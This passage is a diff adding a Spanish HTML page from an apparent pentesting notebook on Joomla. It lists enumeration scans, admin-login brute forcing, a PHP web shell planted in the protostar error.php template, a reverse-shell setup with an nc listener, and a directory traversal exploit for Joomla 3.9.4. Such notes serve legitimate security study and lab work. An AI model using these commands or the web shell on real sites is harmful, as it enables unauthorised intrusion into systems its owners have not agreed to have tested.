@@ -1,0 +1,165 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>Joomla | Notebook</title>
+    <script src="/theme.js"></script>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
+
+        <article class="note-panel is-active" id="joomla">
+          <div class="note-tabbar">
+            <span>Joomla</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Aplicaciones Web/CMS</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">aplicaciones web / cms / joomla</p>
+            <h2>Joomla</h2>
+
+            <h2>Enumeración</h2>
+
+            <section class="code-card">
+              <h3>Identificar Joomla</h3>
+              <pre><code>curl -s http://&lt;ip_target&gt; | grep Joomla</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Nmap</h3>
+              <pre><code># Enumerar versión y extensiones
+nmap -sV --script http-joomla-enum &lt;url&gt;
+
+# Enumerar vulnerabilidades
+nmap -sV --script &quot;http-joomla* and not http-joomla-brute&quot; &lt;url&gt;
+nmap --script=http-vuln* -p 80,443 &lt;url&gt;
+
+# Enumerar usuarios
+nmap -sV --script http-joomla-users &lt;url&gt;</code></pre>
+            </section>
+
+            <aside class="callout">
+              <p>Revisar <code>CHANGELOG.txt</code>, <code>robots.txt</code>, <code>README.txt</code> y el panel <code>/administrator</code>.</p>
+            </aside>
+
+            <h2><a href="https://github.com/SamJoan/droopescan">Droopescan</a></h2>
+
+            <section class="code-card">
+              <h3>Droopescan</h3>
+              <pre><code>sudo pip3 install droopescan
+droopescan scan joomla --url &lt;url&gt;</code></pre>
+            </section>
+
+            <h2><a href="https://github.com/OWASP/joomscan">Joomscan</a></h2>
+
+            <section class="code-card">
+              <h3>Joomscan</h3>
+              <pre><code># Análisis básico
+joomscan --url &lt;url_joomla&gt;
+python2.7 joomlascan.py -u &lt;url_joomla&gt;
+
+# Enumerar extensiones
+joomscan --url &lt;url_joomla&gt; --enumerate-extensions
+
+# Enumerar usuarios
+joomscan --url &lt;url_joomla&gt; --enumerate-users</code></pre>
+            </section>
+
+            <h2><a href="https://github.com/ajnik/joomla-bruteforce">Fuerza bruta Joomla-Brute</a></h2>
+
+            <section class="code-card">
+              <h3>Fuerza bruta</h3>
+              <pre><code>python3 joomla-brute.py -u &lt;url&gt; -w &lt;rockyou.txt&gt; -usr &lt;admin&gt;</code></pre>
+            </section>
+
+            <h2>Explotar acceso a Joomla</h2>
+
+            <p>Con credenciales se puede modificar el código fuente de un <code>Template</code>. Ruta típica: <code>Templates (Administrator)</code> → seleccionar template → editar un fichero como <code>error.php</code>.</p>
+
+            <section class="code-card">
+              <h3>RCE en template protostar/error.php</h3>
+              <pre><code>&lt;?php
+&lt;DATA&gt;
+system($_GET[&#x27;cmd&#x27;]);
+&lt;DATA&gt;
+?&gt;</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Ejecutar RCE</h3>
+              <pre><code>curl &quot;http://&lt;target&gt;/templates/protostar/error.php?cmd=id&quot;</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Reverse shell en template protostar/error.php</h3>
+              <pre><code>&lt;?php
+pentest_monkey_php_rev_shell
+&lt;DATA&gt;
+?&gt;</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Listener</h3>
+              <pre><code># Ejecutar una URL que genere error para cargar error.php
+nc -nlvp 443</code></pre>
+            </section>
+
+            <h2><a href="https://www.exploit-db.com/exploits/46710">Joomla v3.9.4 vulnerable</a></h2>
+
+            <section class="code-card">
+              <h3>Directory traversal autenticado</h3>
+              <pre><code>python exploit.py --url=http://example.com/administrator --username=&lt;joomla-manager-username&gt; --password=&lt;joomla-manager-password&gt; --dir=&lt;directory_name&gt;
+
+python2.7 joomla_dir_trav.py --url &quot;http://dev.inlanefreight.local/administrator/&quot; --username admin --password admin --dir /</code></pre>
+            </section>
+
+            <h2>Instalación de Python 2.7</h2>
+
+            <section class="code-card">
+              <h3>pyenv</h3>
+              <pre><code>curl https://pyenv.run | bash
+echo &#x27;export PYENV_ROOT=&quot;$HOME/.pyenv&quot;&#x27; &gt;&gt; ~/.bashrc
+echo &#x27;command -v pyenv &gt;/dev/null || export PATH=&quot;$PYENV_ROOT/bin:$PATH&quot;&#x27; &gt;&gt; ~/.bashrc
+echo &#x27;eval &quot;$(pyenv init -)&quot;&#x27; &gt;&gt; ~/.bashrc
+source ~/.bashrc
+pyenv install 2.7
+pyenv shell 2.7
+
+python2.7 -m pip install urllib3
+python2.7 -m pip install certifi
+python2.7 -m pip install bs4</code></pre>
+            </section>
+
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>aplicaciones_web</span>
+              <span>cms</span>
+              <span>joomla</span>
+              <span>joomscan</span>
+              <span>droopescan</span>
+              <span>rce</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
